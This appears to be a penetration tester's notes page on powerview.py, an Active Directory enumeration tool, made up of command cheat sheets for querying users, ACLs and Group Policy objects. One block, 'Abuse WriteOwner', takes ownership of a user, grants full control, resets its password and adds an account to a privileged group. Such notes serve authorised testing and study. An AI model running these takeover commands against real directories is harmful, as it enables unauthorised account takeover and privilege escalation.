---
tags:
  - tool
---
# powerview.py

Execute PowerView commands as if you had a foothold - https://github.com/aniqfakhrul/powerview.py (installable with pipx).

Most underrated tool for AD enumeration in my opinion.

## Capabilities

```powershell
# Connect (uses impacket formating)
powerview $DOMAIN/$USER:'$PASSWD'@$TARGET

# Show help
-h

# Get user list
Get-DomainUser -Select sAMAccountName

# Add domain group member
Add-DomainGroupMember -Identity '$TARGET_GROUP' -Members $USER

# View ACLs for an object
Get-ObjectAcl -Identity $PRINCIPAL -Select SecurityIdentifier,AccessMask,ActiveDirectoryRights,ObjectAceType -ResolveGUIDs -TableView

# Abuse WriteOwner
Set-DomainObjectOwner -TargetIdentity chap -PrincipalIdentity lilia
Add-DomainObjectAcl -TargetIdentity chap -PrincipalIdentity lilia -Rights fullcontrol

Set-DomainUserPassword -Identity chap -AccountPassword Password123!
Add-DomainGroupMember -Identity management -Members lilia

# Enumerate users with SIDHistory attribute populated
Get-DomainUser -Where 'SIDHistory contains *' -Properties sAMAccountName,SIDHistory -TableView
```

### GPO

```powershell
# Enumerate GPOs with PowerView
Get-DomainGPO -Properties * -Select displayname,name -TableView

# Enumerate objects with privileges over an existing GPO
Get-DomainObjectAcl -Identity 'CN={GPO},CN=Policies,CN=System,$DOMAIN_DN' -ResolveGUIDs -Select SecurityIdentifier,ActiveDirectoryRights -TableView

# Enumerate users with rights to create GPOs
Get-DomainObjectAcl -Identity 'CN=Policies,CN=System,$DOMAIN_DN' -ResolveGUIDs -Where 'AccessMask contains CreateChild' -Select SecurityIdentifier

# Enumerate GPO links from sites, the domain, and OUs
Get-DomainObject -SearchBase 'CN=Sites,CN=Configuration,$DOMAIN_DN' -LDAPFilter '(objectClass=site)' -Properties distinguishedname,gplink -Select distinguishedname,gplink -TableView
Get-DomainObject -Identity '$DOMAIN_DN' -Properties * -Select distinguishedname,gplink -TableView
Get-DomainOU -Properties * -Select distinguishedname,gplink -TableView

# Enumerate computers in the target OU
Get-DomainComputer -SearchBase 'OU=Workstations,$DOMAIN_DN' -Select dNSHostName

# Enumerate users in the target OU
Get-DomainUser -SearchBase 'OU=Workstations,$DOMAIN_DN' -Select dNSHostName

# Enumerate ACLs for GPO links (GP-Link AceType) in sites
Get-DomainObjectAcl -SearchBase 'CN=Sites,CN=Configuration,$DOMAIN_DN' -Where 'ObjectAceType eq f30e3bbe-9ff0-11d1-b603-0000f80367c1' -Select SecurityIdentifier,AccessMask,ObjectDN -TableView

# Enumerate ACLs tied to GPO links (GP-Link AceType) in the domain
Get-DomainObjectAcl -Identity '$DOMAIN_DN' -Where 'ObjectAceType eq f30e3bbe-9ff0-11d1-b603-0000f80367c1' -Select SecurityIdentifier,AccessMask,ObjectDN -TableView

# Enumerate ACLs for GPO links (GP-Link AceType) in a target OU
Get-DomainObjectAcl -Identity 'OU=Servers,$DOMAIN_DN' -Where 'ObjectAceType eq f30e3bbe-9ff0-11d1-b603-0000f80367c1' -Select SecurityIdentifier,AccessMask,ObjectDN -TableView

# Create a new GPO (powerview.py)
Add-DomainGPO -Identity '$GPO_NAME' -Description '$DESC' -LinkTo 'OU=Servers,$DOMAIN_DN'
```
